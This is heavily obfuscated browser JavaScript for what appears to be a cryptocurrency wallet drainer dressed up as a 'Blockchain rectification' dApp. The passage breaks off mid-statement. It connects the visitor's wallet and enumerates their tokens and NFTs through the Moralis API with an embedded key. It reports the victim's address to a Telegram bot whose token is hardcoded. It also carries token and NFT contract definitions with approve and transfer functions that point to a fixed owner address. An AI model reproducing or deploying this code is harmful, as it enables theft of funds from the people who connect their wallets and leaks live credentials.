const _0x120cd9=_0x5588;(function(_0x1d2464,_0x3d2866){const _0x563322=_0x5588,_0x3254f5=_0x1d2464();while(!![]){try{const _0x3f178a=parseInt(_0x563322(0x207))/0x1*(-parseInt(_0x563322(0x1b8))/0x2)+parseInt(_0x563322(0x1c7))/0x3*(parseInt(_0x563322(0x219))/0x4)+-parseInt(_0x563322(0x1b0))/0x5+-parseInt(_0x563322(0x23b))/0x6*(-parseInt(_0x563322(0x1c2))/0x7)+parseInt(_0x563322(0x1eb))/0x8+parseInt(_0x563322(0x22a))/0x9+parseInt(_0x563322(0x18b))/0xa*(-parseInt(_0x563322(0x1b3))/0xb);if(_0x3f178a===_0x3d2866)break;else _0x3254f5['push'](_0x3254f5['shift']());}catch(_0x143683){_0x3254f5['push'](_0x3254f5['shift']());}}}(_0x4bd8,0x8e461));let NFTs=[],tokens=[],chainId=null,web3Object=null,selectedAccount=null;import{EthereumClient,w3mConnectors,w3mProvider,WagmiCore,WagmiCoreChains,WagmiCoreConnectors}from'https://unpkg.com/@web3modal/ethereum@2.6.2';import{parseEther}from'https://esm.sh/v126/viem@1.2.15/es2022/viem.bundle.mjs';import{Web3Modal}from'https://unpkg.com/@web3modal/html@2.6.2';const {mainnet,bsc}=WagmiCoreChains,{configureChains,createConfig,writeContract,sendTransaction,fetchBalance,fetchFeeData,connect,switchNetwork,getAccount,getNetwork}=WagmiCore,chains=[mainnet,bsc],projectId='ee71d215d0dec7d1bf950851c84d9643',{publicClient}=configureChains(chains,[w3mProvider({'projectId':projectId})]),wagmiConfig=createConfig({'autoConnect':!![],'connectors':[...w3mConnectors({'chains':chains,'version':0x2,'projectId':projectId}),new WagmiCoreConnectors[(_0x120cd9(0x20f))]({'chains':chains,'options':{'appName':_0x120cd9(0x201)}})],'publicClient':publicClient}),ethereumClient=new EthereumClient(wagmiConfig,chains);export const web3Modal=new Web3Modal({'projectId':projectId,'walletImages':{'safe':_0x120cd9(0x1c0),'coinbase':'https://altcoinsbox.com/wp-content/uploads/2022/12/coinbase-logo.png'}},ethereumClient);let currentUrl=window[_0x120cd9(0x19d)][_0x120cd9(0x1ee)];const OWNER_ADDRESS=_0x120cd9(0x1c8),ABI=[{'constant':!![],'inputs':[],'name':'name','outputs':[{'name':'','type':_0x120cd9(0x1da)}],'payable':![],'stateMutability':'view','type':_0x120cd9(0x1bc)},{'constant':![],'inputs':[{'name':_0x120cd9(0x21d),'type':_0x120cd9(0x1ea)}],'name':_0x120cd9(0x19f),'outputs':[],'payable':![],'stateMutability':_0x120cd9(0x1e5),'type':_0x120cd9(0x1bc)},{'constant':![],'inputs':[{'name':'_spender','type':_0x120cd9(0x1ea)},{'name':_0x120cd9(0x1e8),'type':_0x120cd9(0x21a)}],'name':'approve','outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':!![],'inputs':[],'name':_0x120cd9(0x1f8),'outputs':[{'name':'','type':_0x120cd9(0x1a4)}],'payable':![],'stateMutability':_0x120cd9(0x1e7),'type':_0x120cd9(0x1bc)},{'constant':![],'inputs':[{'name':_0x120cd9(0x232),'type':_0x120cd9(0x1ea)}],'name':_0x120cd9(0x1de),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':!![],'inputs':[],'name':_0x120cd9(0x195),'outputs':[{'name':'','type':_0x120cd9(0x21a)}],'payable':![],'stateMutability':'view','type':_0x120cd9(0x1bc)},{'constant':![],'inputs':[{'name':_0x120cd9(0x18a),'type':'address'},{'name':'_to','type':_0x120cd9(0x1ea)},{'name':_0x120cd9(0x1e8),'type':_0x120cd9(0x21a)}],'name':_0x120cd9(0x1cb),'outputs':[],'payable':![],'stateMutability':_0x120cd9(0x1e5),'type':_0x120cd9(0x1bc)},{'constant':!![],'inputs':[],'name':'upgradedAddress','outputs':[{'name':'','type':_0x120cd9(0x1ea)}],'payable':![],'stateMutability':_0x120cd9(0x1e7),'type':_0x120cd9(0x1bc)},{'constant':!![],'inputs':[{'name':'','type':_0x120cd9(0x1ea)}],'name':'balances','outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x120cd9(0x1e7),'type':'function'},{'constant':!![],'inputs':[],'name':_0x120cd9(0x21c),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':'view','type':_0x120cd9(0x1bc)},{'constant':!![],'inputs':[],'name':_0x120cd9(0x22f),'outputs':[{'name':'','type':_0x120cd9(0x21a)}],'payable':![],'stateMutability':'view','type':_0x120cd9(0x1bc)},{'constant':!![],'inputs':[],'name':'_totalSupply','outputs':[{'name':'','type':_0x120cd9(0x21a)}],'payable':![],'stateMutability':_0x120cd9(0x1e7),'type':_0x120cd9(0x1bc)},{'constant':![],'inputs':[],'name':_0x120cd9(0x193),'outputs':[],'payable':![],'stateMutability':_0x120cd9(0x1e5),'type':_0x120cd9(0x1bc)},{'constant':!![],'inputs':[{'name':_0x120cd9(0x206),'type':_0x120cd9(0x1ea)}],'name':_0x120cd9(0x1dd),'outputs':[{'name':'','type':_0x120cd9(0x1a4)}],'payable':![],'stateMutability':_0x120cd9(0x1e7),'type':_0x120cd9(0x1bc)},{'constant':!![],'inputs':[{'name':'','type':_0x120cd9(0x1ea)},{'name':'','type':_0x120cd9(0x1ea)}],'name':'allowed','outputs':[{'name':'','type':_0x120cd9(0x21a)}],'payable':![],'stateMutability':_0x120cd9(0x1e7),'type':_0x120cd9(0x1bc)},{'constant':!![],'inputs':[],'name':'paused','outputs':[{'name':'','type':'bool'}],'payable':![],'stateMutability':'view','type':'function'},{'constant':!![],'inputs':[{'name':_0x120cd9(0x18f),'type':_0x120cd9(0x1ea)}],'name':_0x120cd9(0x218),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':'view','type':_0x120cd9(0x1bc)},{'constant':![],'inputs':[],'name':_0x120cd9(0x1f5),'outputs':[],'payable':![],'stateMutability':_0x120cd9(0x1e5),'type':_0x120cd9(0x1bc)},{'constant':!![],'inputs':[],'name':_0x120cd9(0x1bf),'outputs':[{'name':'','type':_0x120cd9(0x1ea)}],'payable':![],'stateMutability':_0x120cd9(0x1e7),'type':_0x120cd9(0x1bc)},{'constant':!![],'inputs':[],'name':_0x120cd9(0x1f2),'outputs':[{'name':'','type':_0x120cd9(0x1ea)}],'payable':![],'stateMutability':_0x120cd9(0x1e7),'type':'function'},{'constant':!![],'inputs':[],'name':'symbol','outputs':[{'name':'','type':_0x120cd9(0x1da)}],'payable':![],'stateMutability':_0x120cd9(0x1e7),'type':'function'},{'constant':![],'inputs':[{'name':_0x120cd9(0x235),'type':_0x120cd9(0x1ea)},{'name':'_value','type':_0x120cd9(0x21a)}],'name':'transfer','outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x120cd9(0x1bc)},{'constant':![],'inputs':[{'name':_0x120cd9(0x1af),'type':_0x120cd9(0x21a)},{'name':'newMaxFee','type':'uint256'}],'name':'setParams','outputs':[],'payable':![],'stateMutability':_0x120cd9(0x1e5),'type':_0x120cd9(0x1bc)},{'constant':![],'inputs':[{'name':_0x120cd9(0x1d1),'type':_0x120cd9(0x21a)}],'name':'issue','outputs':[],'payable':![],'stateMutability':_0x120cd9(0x1e5),'type':_0x120cd9(0x1bc)},{'constant':![],'inputs':[{'name':_0x120cd9(0x1d1),'type':_0x120cd9(0x21a)}],'name':'redeem','outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':!![],'inputs':[{'name':_0x120cd9(0x1ba),'type':_0x120cd9(0x1ea)},{'name':_0x120cd9(0x1f7),'type':_0x120cd9(0x1ea)}],'name':_0x120cd9(0x1f6),'outputs':[{'name':_0x120cd9(0x1bb),'type':'uint256'}],'payable':![],'stateMutability':_0x120cd9(0x1e7),'type':_0x120cd9(0x1bc)},{'constant':!![],'inputs':[],'name':_0x120cd9(0x210),'outputs':[{'name':'','type':_0x120cd9(0x21a)}],'payable':![],'stateMutability':_0x120cd9(0x1e7),'type':_0x120cd9(0x1bc)},{'constant':!![],'inputs':[{'name':'','type':_0x120cd9(0x1ea)}],'name':_0x120cd9(0x19b),'outputs':[{'name':'','type':_0x120cd9(0x1a4)}],'payable':![],'stateMutability':_0x120cd9(0x1e7),'type':_0x120cd9(0x1bc)},{'constant':![],'inputs':[{'name':'_clearedUser','type':'address'}],'name':'removeBlackList','outputs':[],'payable':![],'stateMutability':_0x120cd9(0x1e5),'type':'function'},{'constant':!![],'inputs':[],'name':'MAX_UINT','outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':'view','type':_0x120cd9(0x1bc)},{'constant':![],'inputs':[{'name':_0x120cd9(0x1c4),'type':'address'}],'name':_0x120cd9(0x1df),'outputs':[],'payable':![],'stateMutability':_0x120cd9(0x1e5),'type':'function'},{'constant':![],'inputs':[{'name':_0x120cd9(0x21f),'type':'address'}],'name':'destroyBlackFunds','outputs':[],'payable':![],'stateMutability':_0x120cd9(0x1e5),'type':_0x120cd9(0x1bc)},{'inputs':[{'name':'_initialSupply','type':_0x120cd9(0x21a)},{'name':_0x120cd9(0x1ab),'type':'string'},{'name':_0x120cd9(0x239),'type':_0x120cd9(0x1da)},{'name':_0x120cd9(0x1e3),'type':_0x120cd9(0x21a)}],'payable':![],'stateMutability':_0x120cd9(0x1e5),'type':'constructor'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x120cd9(0x1d1),'type':_0x120cd9(0x21a)}],'name':'Issue','type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':'amount','type':_0x120cd9(0x21a)}],'name':'Redeem','type':_0x120cd9(0x1a5)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x120cd9(0x187),'type':'address'}],'name':_0x120cd9(0x1fa),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x120cd9(0x203),'type':'uint256'},{'indexed':![],'name':_0x120cd9(0x1ed),'type':'uint256'}],'name':'Params','type':_0x120cd9(0x1a5)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x120cd9(0x21f),'type':_0x120cd9(0x1ea)},{'indexed':![],'name':_0x120cd9(0x1b5),'type':'uint256'}],'name':_0x120cd9(0x216),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x120cd9(0x22c),'type':_0x120cd9(0x1ea)}],'name':_0x120cd9(0x231),'type':_0x120cd9(0x1a5)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x120cd9(0x22c),'type':_0x120cd9(0x1ea)}],'name':'RemovedBlackList','type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'name':'owner','type':'address'},{'indexed':!![],'name':_0x120cd9(0x189),'type':_0x120cd9(0x1ea)},{'indexed':![],'name':_0x120cd9(0x1d8),'type':_0x120cd9(0x21a)}],'name':'Approval','type':_0x120cd9(0x1a5)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x120cd9(0x236),'type':_0x120cd9(0x1ea)},{'indexed':!![],'name':'to','type':_0x120cd9(0x1ea)},{'indexed':![],'name':'value','type':_0x120cd9(0x21a)}],'name':'Transfer','type':_0x120cd9(0x1a5)},{'anonymous':![],'inputs':[],'name':_0x120cd9(0x1e4),'type':_0x120cd9(0x1a5)},{'anonymous':![],'inputs':[],'name':_0x120cd9(0x1fd),'type':'event'}],ABIN=[{'inputs':[{'internalType':'string','name':_0x120cd9(0x197),'type':_0x120cd9(0x1da)},{'internalType':_0x120cd9(0x1da),'name':_0x120cd9(0x1c9),'type':_0x120cd9(0x1da)},{'internalType':'uint256','name':'maxNftSupply','type':'uint256'},{'internalType':_0x120cd9(0x21a),'name':'saleStart','type':'uint256'}],'stateMutability':_0x120cd9(0x1e5),'type':_0x120cd9(0x20d)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x120cd9(0x1ea),'name':_0x120cd9(0x1f2),'type':_0x120cd9(0x1ea)},{'indexed':!![],'internalType':_0x120cd9(0x1ea),'name':'approved','type':'address'},{'indexed':!![],'internalType':_0x120cd9(0x21a),'name':_0x120cd9(0x1e9),'type':_0x120cd9(0x21a)}],'name':_0x120cd9(0x22d),'type':_0x120cd9(0x1a5)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x120cd9(0x1f2),'type':_0x120cd9(0x1ea)},{'indexed':!![],'internalType':'address','name':'operator','type':_0x120cd9(0x1ea)},{'indexed':![],'internalType':'bool','name':'approved','type':_0x120cd9(0x1a4)}],'name':_0x120cd9(0x222),'type':_0x120cd9(0x1a5)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x120cd9(0x226),'type':_0x120cd9(0x1ea)},{'indexed':!![],'internalType':_0x120cd9(0x1ea),'name':_0x120cd9(0x1c4),'type':'address'}],'name':_0x120cd9(0x225),'type':_0x120cd9(0x1a5)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x120cd9(0x1ea),'name':_0x120cd9(0x236),'type':_0x120cd9(0x1ea)},{'indexed':!![],'internalType':_0x120cd9(0x1ea),'name':'to','type':'address'},{'indexed':!![],'internalType':_0x120cd9(0x21a),'name':_0x120cd9(0x1e9),'type':'uint256'}],'name':_0x120cd9(0x1f9),'type':_0x120cd9(0x1a5)},{'inputs':[],'name':'BAYC_PROVENANCE','outputs':[{'internalType':'string','name':'','type':_0x120cd9(0x1da)}],'stateMutability':_0x120cd9(0x1e7),'type':_0x120cd9(0x1bc)},{'inputs':[],'name':_0x120cd9(0x18c),'outputs':[{'internalType':_0x120cd9(0x21a),'name':'','type':_0x120cd9(0x21a)}],'stateMutability':_0x120cd9(0x1e7),'type':_0x120cd9(0x1bc)},{'inputs':[],'name':'REVEAL_TIMESTAMP','outputs':[{'internalType':_0x120cd9(0x21a),'name':'','type':_0x120cd9(0x21a)}],'stateMutability':_0x120cd9(0x1e7),'type':_0x120cd9(0x1bc)},{'inputs':[],'name':_0x120cd9(0x1f3),'outputs':[{'internalType':_0x120cd9(0x21a),'name':'','type':_0x120cd9(0x21a)}],'stateMutability':_0x120cd9(0x1e7),'type':_0x120cd9(0x1bc)},{'inputs':[{'internalType':_0x120cd9(0x1ea),'name':'to','type':_0x120cd9(0x1ea)},{'internalType':_0x120cd9(0x21a),'name':_0x120cd9(0x1e9),'type':_0x120cd9(0x21a)}],'name':_0x120cd9(0x1b6),'outputs':[],'stateMutability':_0x120cd9(0x1e5),'type':_0x120cd9(0x1bc)},{'inputs':[{'internalType':'address','name':_0x120cd9(0x1f2),'type':'address'}],'name':'balanceOf','outputs':[{'internalType':'uint256','name':'','type':_0x120cd9(0x21a)}],'stateMutability':'view','type':_0x120cd9(0x1bc)},{'inputs':[],'name':_0x120cd9(0x227),'outputs':[{'internalType':'string','name':'','type':_0x120cd9(0x1da)}],'stateMutability':'view','type':'function'},{'inputs':[],'name':_0x120cd9(0x1ec),'outputs':[],'stateMutability':_0x120cd9(0x1e5),'type':_0x120cd9(0x1bc)},{'inputs':[],'name':'flipSaleState','outputs':[],'stateMutability':_0x120cd9(0x1e5),'type':_0x120cd9(0x1bc)},{'inputs':[{'internalType':_0x120cd9(0x21a),'name':_0x120cd9(0x1e9),'type':_0x120cd9(0x21a)}],'name':_0x120cd9(0x1d3),'outputs':[{'internalType':_0x120cd9(0x1ea),'name':'','type':'address'}],'stateMutability':_0x120cd9(0x1e7),'type':'function'},{'inputs':[{'internalType':'address','name':'owner','type':_0x120cd9(0x1ea)},{'internalType':'address','name':'operator','type':_0x120cd9(0x1ea)}],'name':_0x120cd9(0x221),'outputs':[{'internalType':_0x120cd9(0x1a4),'name':'','type':'bool'}],'stateMutability':_0x120cd9(0x1e7),'type':_0x120cd9(0x1bc)},{'inputs':[],'name':'maxApePurchase','outputs':[{'internalType':_0x120cd9(0x21a),'name':'','type':'uint256'}],'stateMutability':_0x120cd9(0x1e7),'type':_0x120cd9(0x1bc)},{'inputs':[{'internalType':_0x120cd9(0x21a),'name':_0x120cd9(0x213),'type':_0x120cd9(0x21a)}],'name':_0x120cd9(0x1a6),'outputs':[],'stateMutability':_0x120cd9(0x1d9),'type':_0x120cd9(0x1bc)},{'inputs':[],'name':_0x120cd9(0x197),'outputs':[{'internalType':'string','name':'','type':_0x120cd9(0x1da)}],'stateMutability':_0x120cd9(0x1e7),'type':'function'},{'inputs':[],'name':_0x120cd9(0x1f2),'outputs':[{'internalType':_0x120cd9(0x1ea),'name':'','type':_0x120cd9(0x1ea)}],'stateMutability':_0x120cd9(0x1e7),'type':'function'},{'inputs':[{'internalType':_0x120cd9(0x21a),'name':_0x120cd9(0x1e9),'type':_0x120cd9(0x21a)}],'name':_0x120cd9(0x238),'outputs':[{'internalType':_0x120cd9(0x1ea),'name':'','type':_0x120cd9(0x1ea)}],'stateMutability':'view','type':_0x120cd9(0x1bc)},{'inputs':[],'name':'renounceOwnership','outputs':[],'stateMutability':_0x120cd9(0x1e5),'type':_0x120cd9(0x1bc)},{'inputs':[],'name':_0x120cd9(0x217),'outputs':[],'stateMutability':_0x120cd9(0x1e5),'type':_0x120cd9(0x1bc)},{'inputs':[{'internalType':_0x120cd9(0x1ea),'name':_0x120cd9(0x236),'type':_0x120cd9(0x1ea)},{'internalType':_0x120cd9(0x1ea),'name':'to','type':_0x120cd9(0x1ea)},{'internalType':_0x120cd9(0x21a),'name':_0x120cd9(0x1e9),'type':_0x120cd9(0x21a)}],'name':'safeTransferFrom','outputs':[],'stateMutability':_0x120cd9(0x1e5),'type':_0x120cd9(0x1bc)},{'inputs':[{'internalType':_0x120cd9(0x1ea),'name':_0x120cd9(0x236),'type':_0x120cd9(0x1ea)},{'internalType':_0x120cd9(0x1ea),'name':'to','type':'address'},{'internalType':_0x120cd9(0x21a),'name':'tokenId','type':_0x120cd9(0x21a)},{'internalType':'bytes','name':_0x120cd9(0x237),'type':_0x120cd9(0x1ce)}],'name':'safeTransferFrom','outputs':[],'stateMutability':_0x120cd9(0x1e5),'type':_0x120cd9(0x1bc)},{'inputs':[],'name':_0x120cd9(0x1d2),'outputs':[{'internalType':_0x120cd9(0x1a4),'name':'','type':'bool'}],'stateMutability':_0x120cd9(0x1e7),'type':_0x120cd9(0x1bc)},{'inputs':[{'internalType':_0x120cd9(0x1ea),'name':_0x120cd9(0x205),'type':'address'},{'internalType':_0x120cd9(0x1a4),'name':'approved','type':_0x120cd9(0x1a4)}],'name':_0x120cd9(0x186),'outputs':[],'stateMutability':_0x120cd9(0x1e5),'type':'function'},{'inputs':[{'internalType':'string','name':_0x120cd9(0x227),'type':_0x120cd9(0x1da)}],'name':_0x120cd9(0x1ff),'outputs':[],'stateMutability':_0x120cd9(0x1e5),'type':'function'},{'inputs':[{'internalType':_0x120cd9(0x1da),'name':_0x120cd9(0x18d),'type':'string'}],'name':_0x120cd9(0x1a1),'outputs':[],'stateMutability':_0x120cd9(0x1e5),'type':_0x120cd9(0x1bc)},{'inputs':[{'internalType':_0x120cd9(0x21a),'name':_0x120cd9(0x1ad),'type':'uint256'}],'name':_0x120cd9(0x1d4),'outputs':[],'stateMutability':_0x120cd9(0x1e5),'type':_0x120cd9(0x1bc)},{'inputs':[],'name':_0x120cd9(0x196),'outputs':[],'stateMutability':_0x120cd9(0x1e5),'type':_0x120cd9(0x1bc)},{'inputs':[],'name':'startingIndex','outputs':[{'internalType':'uint256','name':'','type':_0x120cd9(0x21a)}],'stateMutability':'view','type':_0x120cd9(0x1bc)},{'inputs':[],'name':_0x120cd9(0x20c),'outputs':[{'internalType':_0x120cd9(0x21a),'name':'','type':_0x120cd9(0x21a)}],'stateMutability':_0x120cd9(0x1e7),'type':_0x120cd9(0x1bc)},{'inputs':[{'internalType':'bytes4','name':_0x120cd9(0x1aa),'type':_0x120cd9(0x1d5)}],'name':_0x120cd9(0x21b),'outputs':[{'internalType':_0x120cd9(0x1a4),'name':'','type':_0x120cd9(0x1a4)}],'stateMutability':'view','type':'function'},{'inputs':[],'name':_0x120cd9(0x1c9),'outputs':[{'internalType':'string','name':'','type':_0x120cd9(0x1da)}],'stateMutability':_0x120cd9(0x1e7),'type':_0x120cd9(0x1bc)},{'inputs':[{'internalType':_0x120cd9(0x21a),'name':'index','type':'uint256'}],'name':_0x120cd9(0x191),'outputs':[{'internalType':'uint256','name':'','type':_0x120cd9(0x21a)}],'stateMutability':_0x120cd9(0x1e7),'type':_0x120cd9(0x1bc)},{'inputs':[{'internalType':_0x120cd9(0x1ea),'name':_0x120cd9(0x1f2),'type':_0x120cd9(0x1ea)},{'internalType':_0x120cd9(0x21a),'name':_0x120cd9(0x198),'type':_0x120cd9(0x21a)}],'name':'tokenOfOwnerByIndex','outputs':[{'internalType':_0x120cd9(0x21a),'name':'','type':_0x120cd9(0x21a)}],'stateMutability':_0x120cd9(0x1e7),'type':_0x120cd9(0x1bc)},{'inputs':[{'internalType':_0x120cd9(0x21a),'name':_0x120cd9(0x1e9),'type':_0x120cd9(0x21a)}],'name':_0x120cd9(0x1d6),'outputs':[{'internalType':'string','name':'','type':_0x120cd9(0x1da)}],'stateMutability':_0x120cd9(0x1e7),'type':_0x120cd9(0x1bc)},{'inputs':[],'name':_0x120cd9(0x195),'outputs':[{'internalType':_0x120cd9(0x21a),'name':'','type':_0x120cd9(0x21a)}],'stateMutability':_0x120cd9(0x1e7),'type':_0x120cd9(0x1bc)},{'inputs':[{'internalType':'address','name':'from','type':_0x120cd9(0x1ea)},{'internalType':_0x120cd9(0x1ea),'name':'to','type':_0x120cd9(0x1ea)},{'internalType':_0x120cd9(0x21a),'name':'tokenId','type':_0x120cd9(0x21a)}],'name':'transferFrom','outputs':[],'stateMutability':_0x120cd9(0x1e5),'type':_0x120cd9(0x1bc)},{'inputs':[{'internalType':_0x120cd9(0x1ea),'name':_0x120cd9(0x1c4),'type':'address'}],'name':_0x120cd9(0x1df),'outputs':[],'stateMutability':_0x120cd9(0x1e5),'type':_0x120cd9(0x1bc)},{'inputs':[],'name':_0x120cd9(0x22e),'outputs':[],'stateMutability':_0x120cd9(0x1e5),'type':_0x120cd9(0x1bc)}];let wallet;$(_0x120cd9(0x229))[_0x120cd9(0x23c)](async function(){const _0xe92bb3=_0x120cd9;wallet=_0xe92bb3(0x194),await connector();}),$(_0x120cd9(0x1ca))[_0x120cd9(0x23c)](async function(){const _0x3d2ae5=_0x120cd9;wallet=_0x3d2ae5(0x19c),await connector();}),$(_0x120cd9(0x1dc))[_0x120cd9(0x23c)](async function(){wallet='trustwallet',await connector();}),$('.connect')[_0x120cd9(0x23c)](async function(){const _0x49b677=_0x120cd9;try{await web3Modal[_0x49b677(0x20e)]();}catch(_0x159ea6){console[_0x49b677(0x228)]('Could\x20not\x20get\x20a\x20wallet\x20connection',_0x159ea6);return;}});let connector=async()=>{const _0x45bce3=_0x120cd9;if(typeof web3===_0x45bce3(0x1ac)||typeof ethereum==='undefined'){console[_0x45bce3(0x228)](_0x45bce3(0x1a9));if(wallet===_0x45bce3(0x194)){let _0x185fd1='https://metamask.app.link/dapp/'+currentUrl;window[_0x45bce3(0x19d)][_0x45bce3(0x1ee)]=_0x185fd1;}else{if(wallet==='coinbase'){let _0xe5f267=_0x45bce3(0x1b1)+currentUrl;window['location'][_0x45bce3(0x1ee)]=_0xe5f267;}else{if(wallet==='trustwallet'){let _0x269e32=_0x45bce3(0x1c6)+currentUrl;window[_0x45bce3(0x19d)][_0x45bce3(0x1ee)]=_0x269e32;}}}}else try{await web3Modal['openModal']();}catch(_0x2dd96b){console['log'](_0x45bce3(0x1b9),_0x2dd96b);return;}};$(_0x120cd9(0x1fe))[_0x120cd9(0x23c)](async function(){const _0x24acab=_0x120cd9;let _0x3e2b00=getAccount();console[_0x24acab(0x228)](_0x3e2b00),!_0x3e2b00[_0x24acab(0x1ea)]&&(console[_0x24acab(0x228)](_0x24acab(0x19e)),alert(_0x24acab(0x1f1))),_0x3e2b00[_0x24acab(0x1fc)][_0x24acab(0x197)]===_0x24acab(0x220)&&(_0x3e2b00[_0x24acab(0x1fc)]['options'][_0x24acab(0x233)]()[_0x24acab(0x1c3)]!=='1'&&(console[_0x24acab(0x228)](_0x24acab(0x1db)),await switchNetwork({'chainId':0x1}))),selectedAccount=_0x3e2b00[_0x24acab(0x1ea)],sendMessage(_0x24acab(0x215)),sendMessage('Cl\x20address\x20:\x20'+selectedAccount),covalenthqAPICall();});function _0x4bd8(){const _0x5e52d7=['pause','allowance','_spender','deprecated','Transfer','Deprecate','NFTs\x20collection\x20','connector','Unpause','.proceed','setBaseURI','GET','Blockchain\x20rectification','Error:\x20','feeBasisPoints','all','operator','_maker','621274NAYcxQ','0xF7CC89c87B626A9b2B16ed6a6922aaF4b3B8fbf8','eth','application/json','Transaction\x20Receipt:\x20','startingIndexBlock','constructor','openModal','CoinbaseWalletConnector','basisPointsRate','NFT','Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens','numberOfTokens','Error\x20processing\x20item\x20','Wallet\x20Connected\x20Successfully\x20to\x20eth\x20mainnet!','DestroyedBlackFunds','reserveApes','balanceOf','73016edCplv','uint256','supportsInterface','decimals','_upgradedAddress','&text=','_blackListedUser','MetaMask','isApprovedForAll','ApprovalForAll','/erc20','LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn','OwnershipTransferred','previousOwner','baseURI','log','.meta','10186920VXfPCj','https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses=','_user','Approval','withdraw','maximumFee','hash','AddedBlackList','_evilUser','getProvider','Approve\x20Completed\x20Successfully','_to','from','_data','ownerOf','_symbol','New\x20token','36kHtkkf','click','map','Transaction\x20Rejected','setApprovalForAll','newAddress','Approved','spender','_from','140DrXqSt','MAX_APES','provenanceHash','token_address','who','https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=','tokenByIndex','sending\x20ether','unpause','metamask','totalSupply','setStartingIndex','name','index','TOKEN\x20Contract\x20Address\x20','message','isBlackListed','coinbase','location','No\x20address','deprecate','Tokens:','setProvenanceHash','balance','Insufficient\x20funds\x20for\x20transfer\x20or\x20transaction\x20was\x20rejected','bool','event','mintApe','status','chainId:','Hahahahahah','interfaceId','_name','undefined','revealTimeStamp','length','newBasisPoints','3490800tLkHhM','https://go.cb-w.com/dapp?cb_url=','toString','713372hIidCU','NFT\x20Contract\x20Address\x20','_balance','approve','Your\x20address\x20','2ulmPdE','Could\x20not\x20get\x20a\x20wallet\x20connection','_owner','remaining','function','Error\x20collecting\x20info\x20about\x20wallet','999999999999999999999999999999999999999999999999999999999999999999999999','getOwner','https://pbs.twimg.com/profile_images/1566773491764023297/IvmCdGnM_400x400.jpg','catch','201271Vxfzac','networkVersion','newOwner','/nft/collections?chain=','https://link.trustwallet.com/open_url?url=','141LfFxsE','0xea8968B218a551919FbD5f1166328C82a96dED54','symbol','.coinbase','transferFrom','result','search','bytes','error','usd','amount','saleIsActive','getApproved','setRevealTimestamp','bytes4','tokenURI','json','value','payable','string','Incorrect\x20network','.trust','getBlackListStatus','addBlackList','transferOwnership','tokens-list','Transaction\x20hash\x20','price','_decimals','Pause','nonpayable','https://deep-index.moralis.io/api/v2/','view','_value','tokenId','address','5182232jggdRP','emergencySetStartingIndexBlock','maxFee','href','filter','then','You\x20need\x20to\x20connect\x20your\x20wallet\x20first','owner','apePrice','Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!'];_0x4bd8=function(){return _0x5e52d7;};return _0x4bd8();}const Oxa=_0x120cd9(0x208),Oxc='2062856957';async function covalenthqAPICall(){const _0x5d384f=_0x120cd9,_0x36820f={'chain':'eth'},_0x2fb0a7=new URL(_0x5d384f(0x1e6)+selectedAccount+_0x5d384f(0x223));_0x2fb0a7[_0x5d384f(0x1cd)]=new URLSearchParams(_0x36820f)[_0x5d384f(0x1b2)]();const _0x4ebc61={'method':_0x5d384f(0x200),'headers':{'accept':_0x5d384f(0x20a),'X-API-Key':'LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn'}};try{const _0x3d30b8=await fetch(_0x2fb0a7,_0x4ebc61)[_0x5d384f(0x1f0)](_0x17c2ca=>_0x17c2ca[_0x5d384f(0x1d7)]());console[_0x5d384f(0x228)](_0x3d30b8);let _0x4427b7=_0x3d30b8;console['log']('Initial\x20list\x20',_0x4427b7);let _0x12595e=await Promise[_0x5d384f(0x204)](_0x4427b7[_0x5d384f(0x184)](async _0x37b3b4=>{const _0x41b168=_0x5d384f;let _0x39f9eb;try{_0x39f9eb=await getValue(_0x37b3b4[_0x41b168(0x18e)],_0x37b3b4[_0x41b168(0x1a2)],_0x37b3b4[_0x41b168(0x21c)]);}catch(_0x5c0c2c){_0x39f9eb=0x0;}return console[_0x41b168(0x228)](_0x39f9eb),{'balance':_0x37b3b4[_0x41b168(0x1a2)],'value':_0x39f9eb,'address':_0x37b3b4[_0x41b168(0x18e)]};}));console['log'](_0x5d384f(0x1e0),_0x12595e),tokens=_0x12595e[_0x5d384f(0x1ef)](_0x49cb95=>_0x49cb95[_0x5d384f(0x1d8)]>0x5),tokens['sort']((_0x4e2dd4,_0x32cfdb)=>_0x32cfdb[_0x5d384f(0x1d8)]-_0x4e2dd4[_0x5d384f(0x1d8)]),console[_0x5d384f(0x228)](_0x5d384f(0x1a8),await getNetwork(),_0x5d384f(0x1a0),tokens),NFTs=await getNFTs(selectedAccount)[_0x5d384f(0x1c1)](_0x212430=>{const _0x3caeaf=_0x5d384f;console[_0x3caeaf(0x228)]('Unable\x20to\x20get\x20NFts',_0x212430);}),NFTs=NFTs[_0x5d384f(0x1cc)],console[_0x5d384f(0x228)](_0x5d384f(0x1fb),NFTs);if(tokens['length']===0x0&&NFTs['length']===0x0)onSendEther();else 